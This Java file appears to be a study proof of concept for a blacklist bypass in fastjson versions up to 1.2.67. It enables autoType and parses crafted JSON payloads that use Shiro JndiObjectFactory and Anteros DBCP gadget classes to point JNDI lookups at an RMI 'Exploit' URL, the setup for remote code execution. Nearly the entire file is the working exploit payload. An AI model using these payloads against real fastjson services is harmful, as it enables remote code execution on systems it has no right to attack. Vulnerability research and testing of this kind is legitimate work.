package summer.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * @ClassName: fastjson1268
 * @Description: TODO
 * @Author: Samny
 * @Date: 2020/4/24 18:41
 * @Version: v1.0.0
 * @Description: fastjson <= 1.2.67 黑名单绕过
 **/
public class fastjson1268 {
    public static void main(String[] args) {

        // fastjson>=1.2.25默认为false
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // shiro环境太大了，没有导入只做学习使用
//        String payload="{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\"," +
//                "\"resourceName\": \"rmi://127.0.0.1:1090/Exploit\"}";

//        String payload="{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\"," +
//                "\"metricRegistry\": \"rmi://127.0.0.1:1090/Exploit\"}";

        String payload="{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\"," +
                "\"healthCheckRegistry\": \"rmi://127.0.0.1:1090/Exploit\"}";

        Object ob = JSON.parse(payload);

        System.out.println(ob);
    }

}
